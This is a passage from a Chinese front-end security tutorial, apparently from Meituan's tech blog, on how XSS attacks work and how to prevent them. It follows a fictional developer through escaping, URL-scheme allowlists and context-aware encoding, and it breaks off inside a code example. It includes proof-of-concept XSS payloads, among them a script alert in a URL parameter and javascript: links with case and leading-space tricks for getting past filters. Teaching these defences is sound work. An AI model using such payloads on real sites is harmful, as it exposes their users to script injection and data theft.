I"<h1 id="前端安全系列一如何防止xss攻击"><a href="https://tech.meituan.com/2018/09/27/fe-security.html">前端安全系列（一）如何防止XSS攻击？</a></h1>

<h2 id="前端安全">前端安全</h2>

<p>随着互联网的高速发展，信息安全问题已经成为企业最为关注的焦点之一，而前端又是引发企业安全问题的高危据点。在移动互联网时代，前端人员除了传统的 XSS、CSRF 等安全问题之外，又时常遭遇网络劫持、非法调用 Hybrid API 等新型安全问题。当然，浏览器自身也在不断在进化和发展，不断引入 CSP、Same-Site Cookies 等新技术来增强安全性，但是仍存在很多潜在的威胁，这需要前端技术人员不断进行“查漏补缺”。</p>

<p>近几年，美团业务高速发展，前端随之面临很多安全挑战，因此积累了大量的实践经验。我们梳理了常见的前端安全问题以及对应的解决方案，将会做成一个系列，希望可以帮助前端人员在日常开发中不断预防和修复安全漏洞。本文是该系列的第一篇。</p>

<p><strong>本文我们会讲解 XSS ，主要包括：</strong></p>

<ol>
  <li>XSS 攻击的介绍</li>
  <li>XSS 攻击的分类</li>
  <li>XSS 攻击的预防和检测</li>
  <li>XSS 攻击的总结</li>
  <li>XSS 攻击案例</li>
</ol>

<h2 id="xss-攻击的介绍">XSS 攻击的介绍</h2>

<p>在开始本文之前，我们先提出一个问题，请判断以下两个说法是否正确：</p>

<ol>
  <li>XSS 防范是后端 RD（研发人员）的责任，后端 RD 应该在所有用户提交数据的接口，对敏感字符进行转义，才能进行下一步操作。</li>
  <li>所有要插入到页面上的数据，都要通过一个敏感字符过滤函数的转义，过滤掉通用的敏感字符后，就可以插入到页面中。</li>
</ol>

<p>如果你还不能确定答案，那么可以带着这些问题向下看，我们将逐步拆解问题。</p>

<h3 id="xss-漏洞的发生和修复">XSS 漏洞的发生和修复</h3>

<p>XSS 攻击是页面被注入了恶意的代码，为了更形象的介绍，我们用发生在小明同学身边的事例来进行说明。</p>

<h4 id="一个案例">一个案例</h4>

<p>某天，公司需要一个搜索页面，根据 URL 参数决定关键词的内容。小明很快把页面写好并且上线。代码如下：</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">value=</span><span class="s">"&lt;%= getParameter("</span><span class="na">keyword</span><span class="err">")</span> <span class="err">%</span><span class="nt">&gt;</span>"&gt;
<span class="nt">&lt;button&gt;</span>搜索<span class="nt">&lt;/button&gt;</span>
<span class="nt">&lt;div&gt;</span>
  您搜索的关键词是：<span class="nt">&lt;</span><span class="err">%=</span> <span class="na">getParameter</span><span class="err">("</span><span class="na">keyword</span><span class="err">")</span> <span class="err">%</span><span class="nt">&gt;</span>
<span class="nt">&lt;/div&gt;</span>
</code></pre></div></div>

<p>然而，在上线后不久，小明就接到了安全组发来的一个神秘链接：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://xxx/search?keyword="&gt;&lt;script&gt;alert('XSS');&lt;/script&gt;
</code></pre></div></div>

<p>小明带着一种不祥的预感点开了这个链接[请勿模仿，确认安全的链接才能点开]。果然，页面中弹出了写着”XSS”的对话框。</p>

<blockquote>
  <p>可恶，中招了！小明眉头一皱，发现了其中的奥秘：</p>
</blockquote>

<p>当浏览器请求 <code class="language-plaintext highlighter-rouge">http://xxx/search?keyword="&gt;&lt;script&gt;alert('XSS');&lt;/script&gt;</code> 时，服务端会解析出请求参数 <code class="language-plaintext highlighter-rouge">keyword</code>，得到 <code class="language-plaintext highlighter-rouge">"&gt;&lt;script&gt;alert('XSS');&lt;/script&gt;</code>，拼接到 HTML 中返回给浏览器。形成了如下的 HTML：</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">value=</span><span class="s">""</span><span class="nt">&gt;&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">XSS</span><span class="dl">'</span><span class="p">);</span><span class="nt">&lt;/script&gt;</span>"&gt;
<span class="nt">&lt;button&gt;</span>搜索<span class="nt">&lt;/button&gt;</span>
<span class="nt">&lt;div&gt;</span>
  您搜索的关键词是："&gt;<span class="nt">&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">XSS</span><span class="dl">'</span><span class="p">);</span><span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;/div&gt;</span>
</code></pre></div></div>

<p>浏览器无法分辨出 <code class="language-plaintext highlighter-rouge">&lt;script&gt;alert('XSS');&lt;/script&gt;</code> 是恶意代码，因而将其执行。</p>

<p>这里不仅仅 div 的内容被注入了，而且 input 的 value 属性也被注入， alert 会弹出两次。</p>

<p>面对这种情况，我们应该如何进行防范呢？</p>

<p>其实，这只是浏览器把用户的输入当成了脚本进行了执行。那么只要告诉浏览器这段内容是文本就可以了。</p>

<p>聪明的小明很快找到解决方法，把这个漏洞修复：</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">value=</span><span class="s">"&lt;%= escapeHTML(getParameter("</span><span class="na">keyword</span><span class="err">"))</span> <span class="err">%</span><span class="nt">&gt;</span>"&gt;
<span class="nt">&lt;button&gt;</span>搜索<span class="nt">&lt;/button&gt;</span>
<span class="nt">&lt;div&gt;</span>
  您搜索的关键词是：<span class="nt">&lt;</span><span class="err">%=</span> <span class="na">escapeHTML</span><span class="err">(</span><span class="na">getParameter</span><span class="err">("</span><span class="na">keyword</span><span class="err">"))</span> <span class="err">%</span><span class="nt">&gt;</span>
<span class="nt">&lt;/div&gt;</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">escapeHTML()</code> 按照如下规则进行转义：</p>

<table>
  <tbody>
    <tr>
      <td>字符</td>
      <td>转义后的字符</td>
      <td> </td>
      <td>-</td>
      <td>-</td>
      <td> </td>
      <td><code class="language-plaintext highlighter-rouge">&amp;</code></td>
      <td><code class="language-plaintext highlighter-rouge">&amp;</code></td>
      <td> </td>
      <td><code class="language-plaintext highlighter-rouge">&lt;</code></td>
      <td><code class="language-plaintext highlighter-rouge">&lt;</code></td>
      <td> </td>
      <td><code class="language-plaintext highlighter-rouge">&gt;</code></td>
      <td><code class="language-plaintext highlighter-rouge">&gt;</code></td>
      <td> </td>
      <td><code class="language-plaintext highlighter-rouge">"</code></td>
      <td><code class="language-plaintext highlighter-rouge">"</code></td>
      <td> </td>
      <td><code class="language-plaintext highlighter-rouge">'</code></td>
      <td><code class="language-plaintext highlighter-rouge">'</code></td>
      <td> </td>
      <td><code class="language-plaintext highlighter-rouge">/</code></td>
      <td><code class="language-plaintext highlighter-rouge">/</code></td>
    </tr>
  </tbody>
</table>

<p>经过了转义函数的处理后，最终浏览器接收到的响应为：</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">value=</span><span class="s">"&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(&amp;#x27;XSS&amp;#x27;);&amp;lt;&amp;#x2F;script&amp;gt;"</span><span class="nt">&gt;</span>
<span class="nt">&lt;button&gt;</span>搜索<span class="nt">&lt;/button&gt;</span>
<span class="nt">&lt;div&gt;</span>
  您搜索的关键词是：<span class="ni">&amp;quot;&amp;gt;&amp;lt;</span>script<span class="ni">&amp;gt;</span>alert(<span class="ni">&amp;#x27;</span>XSS<span class="ni">&amp;#x27;</span>);<span class="ni">&amp;lt;&amp;#x2F;</span>script<span class="ni">&amp;gt;</span>
<span class="nt">&lt;/div&gt;</span>
</code></pre></div></div>

<p>恶意代码都被转义，不再被浏览器执行，而且搜索词能够完美的在页面显示出来。</p>

<p><strong>通过这个事件，小明学习到了如下知识：</strong></p>

<ul>
  <li>通常页面中包含的用户输入内容都在固定的容器或者属性内，以文本的形式展示。</li>
  <li>攻击者利用这些页面的用户输入片段，拼接特殊格式的字符串，突破原有位置的限制，形成了代码片段。</li>
  <li>攻击者通过在目标网站上注入脚本，使之在用户的浏览器上运行，从而引发潜在风险。</li>
  <li>通过 HTML 转义，可以防止 XSS 攻击。[事情当然没有这么简单啦！请继续往下看]。</li>
</ul>

<h4 id="注意特殊的-html-属性javascript-api">注意特殊的 HTML 属性、JavaScript API</h4>

<p>自从上次事件之后，小明会小心的把插入到页面中的数据进行转义。而且他还发现了大部分模板都带有的转义配置，让所有插入到页面中的数据都默认进行转义。这样就不怕不小心漏掉未转义的变量啦，于是小明的工作又渐渐变得轻松起来。</p>

<p>但是，作为导演的我，不可能让小明这么简单、开心地改 Bug 。</p>

<p>不久，小明又收到安全组的神秘链接：<code class="language-plaintext highlighter-rouge">http://xxx/?redirect_to=javascript:alert('XSS')</code>。小明不敢大意，赶忙点开页面。然而，页面并没有自动弹出万恶的“XSS”。</p>

<p>小明打开对应页面的源码，发现有以下内容：</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"&lt;%= escapeHTML(getParameter("</span><span class="na">redirect_to</span><span class="err">"))</span> <span class="err">%</span><span class="nt">&gt;</span>"&gt;跳转...<span class="nt">&lt;/a&gt;</span>
</code></pre></div></div>

<p>这段代码，当攻击 URL 为 <code class="language-plaintext highlighter-rouge">http://xxx/?redirect_to=javascript:alert('XSS')</code>，服务端响应就成了：</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"javascript:alert(&amp;#x27;XSS&amp;#x27;)"</span><span class="nt">&gt;</span>跳转...<span class="nt">&lt;/a&gt;</span>
</code></pre></div></div>

<p>虽然代码不会立即执行，但一旦用户点击 <code class="language-plaintext highlighter-rouge">a</code> 标签时，浏览器会就会弹出“XSS”。</p>

<blockquote>
  <p>可恶，又失策了…</p>
</blockquote>

<p>在这里，用户的数据并没有在位置上突破我们的限制，仍然是正确的 href 属性。但其内容并不是我们所预期的类型。</p>

<p>原来不仅仅是特殊字符，连 <code class="language-plaintext highlighter-rouge">javascript:</code> 这样的字符串如果出现在特定的位置也会引发 XSS 攻击。</p>

<p>小明眉头一皱，想到了解决办法：</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// 禁止 URL 以 "javascript:" 开头</span>
<span class="n">xss</span> <span class="o">=</span> <span class="n">getParameter</span><span class="o">(</span><span class="s">"redirect_to"</span><span class="o">).</span><span class="na">startsWith</span><span class="o">(</span><span class="err">'</span><span class="nl">javascript:</span><span class="err">'</span><span class="o">);</span>
<span class="k">if</span> <span class="o">(!</span><span class="n">xss</span><span class="o">)</span> <span class="o">{</span>
  <span class="o">&lt;</span><span class="n">a</span> <span class="n">href</span><span class="o">=</span><span class="s">"&lt;%= escapeHTML(getParameter("</span><span class="n">redirect_to</span><span class="s">"))%&gt;"</span><span class="o">&gt;</span>
    <span class="n">跳转</span><span class="o">...</span>
  <span class="o">&lt;/</span><span class="n">a</span><span class="o">&gt;</span>
<span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
  <span class="o">&lt;</span><span class="n">a</span> <span class="n">href</span><span class="o">=</span><span class="s">"/404"</span><span class="o">&gt;</span>
    <span class="n">跳转</span><span class="o">...</span>
  <span class="o">&lt;/</span><span class="n">a</span><span class="o">&gt;</span>
<span class="o">}</span>
</code></pre></div></div>

<p>只要 URL 的开头不是 <code class="language-plaintext highlighter-rouge">javascript:</code>，就安全了吧？</p>

<p>安全组随手又扔了一个连接：<code class="language-plaintext highlighter-rouge">http://xxx/?redirect_to=jAvascRipt:alert('XSS')</code></p>

<blockquote>
  <p>这也能执行？…..好吧，浏览器就是这么强大。</p>
</blockquote>

<p>小明欲哭无泪，在判断 URL 开头是否为 <code class="language-plaintext highlighter-rouge">javascript:</code> 时，先把用户输入转成了小写，然后再进行比对。</p>

<p>不过，所谓“道高一尺，魔高一丈”。面对小明的防护策略，安全组就构造了这样一个连接：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://xxx/?redirect_to=%20javascript:alert('XSS')
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">%20javascript:alert('XSS')</code> 经过 URL 解析后变成 <code class="language-plaintext highlighter-rouge">javascript:alert('XSS')</code>，这个字符串以空格开头。这样攻击者可以绕过后端的关键词规则，又成功的完成了注入。</p>

<p>最终，小明选择了白名单的方法，彻底解决了这个漏洞：</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// 根据项目情况进行过滤，禁止掉 "javascript:" 链接、非法 scheme 等</span>
<span class="n">allowSchemes</span> <span class="o">=</span> <span class="o">[</span><span class="s">"http"</span><span class="o">,</span> <span class="s">"https"</span><span class="o">];</span>

<span class="n">valid</span> <span class="o">=</span> <span class="n">isValid</span><span class="o">(</span><span class="n">getParameter</span><span class="o">(</span><span class="s">"redirect_to"</span><span class="o">),</span> <span class="n">allowSchemes</span><span class="o">);</span>

<span class="k">if</span> <span class="o">(</span><span class="n">valid</span><span class="o">)</span> <span class="o">{</span>
  <span class="o">&lt;</span><span class="n">a</span> <span class="n">href</span><span class="o">=</span><span class="s">"&lt;%= escapeHTML(getParameter("</span><span class="n">redirect_to</span><span class="s">"))%&gt;"</span><span class="o">&gt;</span>
    <span class="n">跳转</span><span class="o">...</span>
  <span class="o">&lt;/</span><span class="n">a</span><span class="o">&gt;</span>
<span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
  <span class="o">&lt;</span><span class="n">a</span> <span class="n">href</span><span class="o">=</span><span class="s">"/404"</span><span class="o">&gt;</span>
    <span class="n">跳转</span><span class="o">...</span>
  <span class="o">&lt;/</span><span class="n">a</span><span class="o">&gt;</span>
<span class="o">}</span>
</code></pre></div></div>

<p>通过这个事件，小明学习到了如下知识：</p>

<ul>
  <li>做了 HTML 转义，并不等于高枕无忧。</li>
  <li>对于链接跳转，如 <code class="language-plaintext highlighter-rouge">&lt;a href="xxx"</code> 或 <code class="language-plaintext highlighter-rouge">location.href="xxx"</code>，要检验其内容，禁止以 <code class="language-plaintext highlighter-rouge">javascript:</code> 开头的链接，和其他非法的 scheme。</li>
</ul>

<h4 id="根据上下文采用不同的转义规则">根据上下文采用不同的转义规则</h4>

<p>某天，小明为了加快网页的加载速度，把一个数据通过 JSON 的方式内联到 HTML 中：</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
<span class="kd">var</span> <span class="nx">initData</span> <span class="o">=</span> <span class="o">&lt;%=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">toJSON</span><span class="p">()</span> <span class="o">%&gt;</span>
<span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<p>插入 JSON 的地方不能使用 <code class="language-plaintext highlighter-rouge">escapeHTML()</code>，因为转义 <code class="language-plaintext highlighter-rouge">"</code> 后，JSON 格式会被破坏。</p>

<p>但安全组又发现有漏洞，原来这样内联 JSON 也是不安全的：</p>

<ul>
  <li>当 JSON 中包含 <code class="language-plaintext highlighter-rouge">U+2028</code> 或 <code class="language-plaintext highlighter-rouge">U+2029</code> 这两个字符时，不能作为 JavaScript 的字面量使用，否则会抛出语法错误。</li>
  <li>当 JSON 中包含字符串 <code class="language-plaintext highlighter-rouge">&lt;/script&gt;</code> 时，当前的 script 标签将会被闭合，后面的字符串内容浏览器会按照 HTML 进行解析；通过增加下一个 <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> 标签等方法就可以完成注入。</li>
</ul>

<p>于是我们又要实现一个 <code class="language-plaintext highlighter-rouge">escapeEmbedJSON()</code> 函数，对内联 JSON 进行转义。</p>

<p><strong>转义规则如下：</strong></p>

<table>
  <tbody>
    <tr>
      <td>字符</td>
      <td>转义后的字符</td>
      <td> </td>
      <td>-</td>
      <td>-</td>
      <td> </td>
      <td><code class="language-plaintext highlighter-rouge">U+2028</code></td>
      <td><code class="language-plaintext highlighter-rouge">\u2028</code></td>
      <td> </td>
      <td><code class="language-plaintext highlighter-rouge">U+2029</code></td>
      <td><code class="language-plaintext highlighter-rouge">\u2029</code></td>
      <td> </td>
      <td><code class="language-plaintext highlighter-rouge">&lt;</code></td>
      <td><code class="language-plaintext highlighter-rouge">\u003c</code></td>
    </tr>
  </tbody>
</table>

<p><strong>修复后的代码如下：</strong></p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
<span class="kd">var</span> <span class="nx">initData</span> <span class="o">=</span> <span class="o">&lt;%=</span> <span class="nx">escapeEmbedJSON</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">toJSON</span><span class="p">())</span> <span class="o">%&gt;</span>
</code></pre></div></div>

<p><strong>通过这个事件，小明学习到了如下知识：</strong></p>

<ul>
  <li>HTML 转义是非常复杂的，在不同的情况下要采用不同的转义规则。如果采用了错误的转义规则，很有可能会埋下 XSS 隐患。</li>
  <li>应当尽量避免自己写转义库，而应当采用成熟的、业界通用的转义库。</li>
</ul>

<h3 id="漏洞总结">漏洞总结</h3>

<p>小明的例子讲完了，下面我们来系统的看下 XSS 有哪些注入的方法：</p>

<ul>
  <li>在 HTML 中内嵌的文本中，恶意内容以 script 标签形成注入。</li>
  <li>在内联的 JavaScript 中，拼接的数据突破了原本的限制（字符串，变量，方法名等）。</li>
  <li>在标签属性中，恶意内容包含引号，从而突破属性值的限制，注入其他属性或者标签。</li>
  <li>在标签的 href、src 等属性中，包含 <code class="language-plaintext highlighter-rouge">javascript:</code> 等可执行代码。</li>
  <li>在 onload、onerror、onclick 等事件中，注入不受控制代码。</li>
  <li>在 style 属性和标签中，包含类似 <code class="language-plaintext highlighter-rouge">background-image:url("javascript:...");</code> 的代码（新版本浏览器已经可以防范）。</li>
  <li>在 style 属性和标签中，包含类似 <code class="language-plaintext highlighter-rouge">expression(...)</code> 的 CSS 表达式代码（新版本浏览器已经可以防范）。</li>
</ul>

<p>总之，如果开发者没有将用户输入的文本进行合适的过滤，就贸然插入到 HTML 中，这很容易造成注入漏洞。攻击者可以利用漏洞，构造出恶意的代码指令，进而利用恶意代码危害数据安全。</p>

<h2 id="xss-攻击的分类">XSS 攻击的分类</h2>

<p>通过上述几个例子，我们已经对 XSS 有了一些认识。</p>

<h3 id="什么是-xss">什么是 XSS</h3>

<p>Cross-Site Scripting（跨站脚本攻击）简称 XSS，是一种代码注入攻击。攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可获取用户的敏感信息如 Cookie、SessionID 等，进而危害数据安全。</p>

<p>为了和 CSS 区分，这里把攻击的第一个字母改成了 X，于是叫做 XSS。</p>

<p>XSS 的本质是：恶意代码未经过滤，与网站正常的代码混在一起；浏览器无法分辨哪些脚本是可信的，导致恶意脚本被执行。</p>

<p>而由于直接在用户的终端执行，恶意代码能够直接获取用户的信息，或者利用这些信息冒充用户向网站发起攻击者定义的请求。</p>

<p>在部分情况下，由于输入的限制，注入的恶意脚本比较短。但可以通过引入外部的脚本，并由浏览器执行，来完成比较复杂的攻击策略。</p>

<p>这里有一个问题：用户是通过哪种方法“注入”恶意脚本的呢？</p>

<p>不仅仅是业务上的“用户的 UGC 内容”可以进行注入，包括 URL 上的参数等都可以是攻击的来源。在处理输入时，以下内容都不可信：</p>

<ul>
  <li>来自用户的 UGC 信息</li>
  <li>来自第三方的链接</li>
  <li>URL 参数</li>
  <li>POST 参数</li>
  <li>Referer （可能来自不可信的来源）</li>
  <li>Cookie （可能来自其他子域注入）</li>
</ul>

<h3 id="xss-分类">XSS 分类</h3>

<p>根据攻击的来源，XSS 攻击可分为存储型、反射型和 DOM 型三种。</p>

<table>
  <tbody>
    <tr>
      <td>类型</td>
      <td>存储区*</td>
      <td>插入点*</td>
      <td> </td>
      <td>-</td>
      <td>-</td>
      <td> </td>
      <td>存储型 XSS</td>
      <td>后端数据库</td>
      <td>HTML</td>
      <td> </td>
      <td>反射型 XSS</td>
      <td>URL</td>
      <td>HTML</td>
      <td> </td>
      <td>DOM 型 XSS</td>
      <td>后端数据库/前端存储/URL</td>
      <td>前端 JavaScript</td>
    </tr>
  </tbody>
</table>

<ul>
  <li>存储区：恶意代码存放的位置。</li>
  <li>插入点：由谁取得恶意代码，并插入到网页上。</li>
</ul>

<h4 id="存储型-xss">存储型 XSS</h4>

<p>存储型 XSS 的攻击步骤：</p>

<ol>
  <li>攻击者将恶意代码提交到目标网站的数据库中。</li>
  <li>用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在 HTML 中返回给浏览器。</li>
  <li>用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。</li>
  <li>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</li>
</ol>

<p>这种攻击常见于带有用户保存数据的网站功能，如论坛发帖、商品评论、用户私信等。</p>

<h4 id="反射型-xss">反射型 XSS</h4>

<p>反射型 XSS 的攻击步骤：</p>

<ol>
  <li>攻击者构造出特殊的 URL，其中包含恶意代码。</li>
  <li>用户打开带有恶意代码的 URL 时，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器。</li>
  <li>用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。</li>
  <li>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</li>
</ol>

<p>反射型 XSS 跟存储型 XSS 的区别是：存储型 XSS 的恶意代码存在数据库里，反射型 XSS 的恶意代码存在 URL 里。</p>

<p>反射型 XSS 漏洞常见于通过 URL 传递参数的功能，如网站搜索、跳转等。</p>

<p>由于需要用户主动打开恶意的 URL 才能生效，攻击者往往会结合多种手段诱导用户点击。</p>

<p>POST 的内容也可以触发反射型 XSS，只不过其触发条件比较苛刻（需要构造表单提交页面，并引导用户点击），所以非常少见。</p>

<h4 id="dom-型-xss">DOM 型 XSS</h4>

<p>DOM 型 XSS 的攻击步骤：</p>

<ol>
  <li>攻击者构造出特殊的 URL，其中包含恶意代码。</li>
  <li>用户打开带有恶意代码的 URL。</li>
  <li>用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行。</li>
  <li>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</li>
</ol>

<p>DOM 型 XSS 跟前两种 XSS 的区别：DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。</p>

<h2 id="xss-攻击的预防">XSS 攻击的预防</h2>

<p>通过前面的介绍可以得知，XSS 攻击有两大要素：</p>

<ol>
  <li>攻击者提交恶意代码。</li>
  <li>浏览器执行恶意代码。</li>
</ol>

<p>针对第一个要素：我们是否能够在用户输入的过程，过滤掉用户输入的恶意代码呢？</p>

<h3 id="输入过滤">输入过滤</h3>

<p>在用户提交时，由前端过滤输入，然后提交到后端。这样做是否可行呢？</p>

<p>答案是不可行。一旦攻击者绕过前端过滤，直接构造请求，就可以提交恶意代码了。</p>

<p>那么，换一个过滤时机：后端在写入数据库前，对输入进行过滤，然后把“安全的”内容，返回给前端。这样是否可行呢？</p>

<p>我们举一个例子，一个正常的用户输入了 <code class="language-plaintext highlighter-rouge">5 &lt; 7</code> 这个内容，在写入数据库前，被转义，变成了 <code class="language-plaintext highlighter-rouge">5 &lt; 7</code>。</p>

<p>问题是：在提交阶段，我们并不确定内容要输出到哪里。</p>

<p>这里的“并不确定内容要输出到哪里”有两层含义：</p>

<ol>
  <li>
    <p>用户的输入内容可能同时提供给前端和客户端，而一旦经过了 <code class="language-plaintext highlighter-rouge">escapeHTML()</code>，客户端显示的内容就变成了乱码( <code class="language-plaintext highlighter-rouge">5 &lt; 7</code> )。</p>
  </li>
  <li>
    <p>在前端中，不同的位置所需的编码也不同。</p>

    <ul>
      <li>当 <code class="language-plaintext highlighter-rouge">5 &lt; 7</code> 作为 HTML 拼接页面时，可以正常显示：</li>
    </ul>

    <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;div</span> <span class="na">title=</span><span class="s">"comment"</span><span class="nt">&gt;</span>5 <span class="ni">&amp;lt;</span> 7<span class="nt">&lt;/div&gt;</span>
</code></pre></div>    </div>

    <ul>
      <li>当 <code class="language-plaintext highlighter-rouge">5 &lt; 7</code> 通过 Ajax 返回，然后赋值给 JavaScript 的变量时，前端得到的字符串就是转义后的字符。这个内容不能直接用于 Vue 等模板的展示，也不能直接用于内容长度计算。不能用于标题、alert 等。</li>
    </ul>
  </li>
</ol>

<p>所以，输入侧过滤能够在某些情况下解决特定的 XSS 问题，但会引入很大的不确定性和乱码问题。在防范 XSS 攻击时应避免此类方法。</p>

<p>当然，对于明确的输入类型，例如数字、URL、电话号码、邮件地址等等内容，进行输入过滤还是必要的。</p>

<p>既然输入过滤并非完全可靠，我们就要通过“防止浏览器执行恶意代码”来防范 XSS。这部分分为两类：</p>

<ul>
  <li>防止 HTML 中出现注入。</li>
  <li>防止 JavaScript 执行时，执行恶意代码。</li>
</ul>

<h3 id="预防存储型和反射型-xss-攻击">预防存储型和反射型 XSS 攻击</h3>

<p>存储型和反射型 XSS 都是在服务端取出恶意代码后，插入到响应 HTML 里的，攻击者刻意编写的“数据”被内嵌到“代码”中，被浏览器所执行。</p>

<p>预防这两种漏洞，有两种常见做法：</p>

<ul>
  <li>改成纯前端渲染，把代码和数据分隔开。</li>
  <li>对 HTML 做充分转义。</li>
</ul>

<h4 id="纯前端渲染">纯前端渲染</h4>

<p>纯前端渲染的过程：</p>

<ol>
  <li>浏览器先加载一个静态 HTML，此 HTML 中不包含任何跟业务相关的数据。</li>
  <li>然后浏览器执行 HTML 中的 JavaScript。</li>
  <li>JavaScript 通过 Ajax 加载业务数据，调用 DOM API 更新到页面上。</li>
</ol>

<p>在纯前端渲染中，我们会明确的告诉浏览器：下面要设置的内容是文本（<code class="language-plaintext highlighter-rouge">.innerText</code>），还是属性（<code class="language-plaintext highlighter-rouge">.setAttribute</code>），还是样式（<code class="language-plaintext highlighter-rouge">.style</code>）等等。浏览器不会被轻易的被欺骗，执行预期外的代码了。</p>

<p>但纯前端渲染还需注意避免 DOM 型 XSS 漏洞（例如 <code class="language-plaintext highlighter-rouge">onload</code> 事件和 <code class="language-plaintext highlighter-rouge">href</code> 中的 <code class="language-plaintext highlighter-rouge">javascript:xxx</code> 等，请参考下文”预防 DOM 型 XSS 攻击“部分）。</p>

<p>在很多内部、管理系统中，采用纯前端渲染是非常合适的。但对于性能要求高，或有 SEO 需求的页面，我们仍然要面对拼接 HTML 的问题。</p>

<h4 id="转义-html">转义 HTML</h4>

<p>如果拼接 HTML 是必要的，就需要采用合适的转义库，对 HTML 模板各处插入点进行充分的转义。</p>

<p>常用的模板引擎，如 doT.js、ejs、FreeMarker 等，对于 HTML 转义通常只有一个规则，就是把 <code class="language-plaintext highlighter-rouge">&amp; &lt; &gt; " ' /</code> 这几个字符转义掉，确实能起到一定的 XSS 防护作用，但并不完善：</p>

<table>
  <tbody>
    <tr>
      <td>XSS 安全漏洞</td>
      <td>简单转义是否有防护作用</td>
      <td> </td>
      <td>-</td>
      <td>-</td>
      <td> </td>
      <td>HTML 标签文字内容</td>
      <td>有</td>
      <td> </td>
      <td>HTML 属性值</td>
      <td>有</td>
      <td> </td>
      <td>CSS 内联样式</td>
      <td>无</td>
      <td> </td>
      <td>内联 JavaScript</td>
      <td>无</td>
      <td> </td>
      <td>内联 JSON</td>
      <td>无</td>
      <td> </td>
      <td>跳转链接</td>
      <td>无</td>
    </tr>
  </tbody>
</table>

<p>所以要完善 XSS 防护措施，我们要使用更完善更细致的转义策略。</p>

<p>例如 Java 工程里，常用的转义库为 <code class="language-plaintext highlighter-rouge">org.owasp.encoder</code>。以下代码引用自 <a href="https://www.owasp.org/index.php/OWASP_Java_Encoder_Project#tab=Use_the_Java_Encoder_Project">org.owasp.encoder 的官方说明</a>。</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- HTML 标签内文字内容 --&gt;</span>
<span class="nt">&lt;div&gt;&lt;</span><span class="err">%=</span> <span class="na">Encode</span><span class="err">.</span><span class="na">forHtml</span><span class="err">(</span><span class="na">UNTRUSTED</span><span class="err">)</span> <span class="err">%</span><span class="nt">&gt;&lt;/div&gt;</span>

<span class="c">&lt;!-- HTML 标签属性值 --&gt;</span>
<span class="nt">&lt;input</span> <span class="na">value=</span><span class="s">"&lt;%= Encode.forHtml(UNTRUSTED) %&gt;"</span> <span class="nt">/&gt;</span>

<span class="c">&lt;!-- CSS 属性值 --&gt;</span>
<span class="nt">&lt;div</span> <span class="na">style=</span><span class="s">"width:&lt;= Encode.forCssString(UNTRUSTED) %&gt;"</span><span class="nt">&gt;</span>

<span class="c">&lt;!-- CSS URL --&gt;</span>
<span class="nt">&lt;div</span> <span class="na">style=</span><span class="s">"background:&lt;= Encode.forCssUrl(UNTRUSTED) %&gt;"</span><span class="nt">&gt;</span>

<span class="c">&lt;!-- JavaScript 内联代码块 --&gt;</span>
<span class="nt">&lt;script&gt;</span>
  <span class="kd">var</span> <span class="nx">msg</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">&lt;%= Encode.forJavaScript(UNTRUSTED) %&gt;</span><span class="dl">"</span><span class="p">;</span>
  <span class="nx">alert</span><span class="p">(</span><span class="nx">msg</span><span class="p">);</span>
<span class="nt">&lt;/script&gt;</span>

<span class="c">&lt;!-- JavaScript 内联代码块内嵌 JSON --&gt;</span>
<span class="nt">&lt;script&gt;</span>
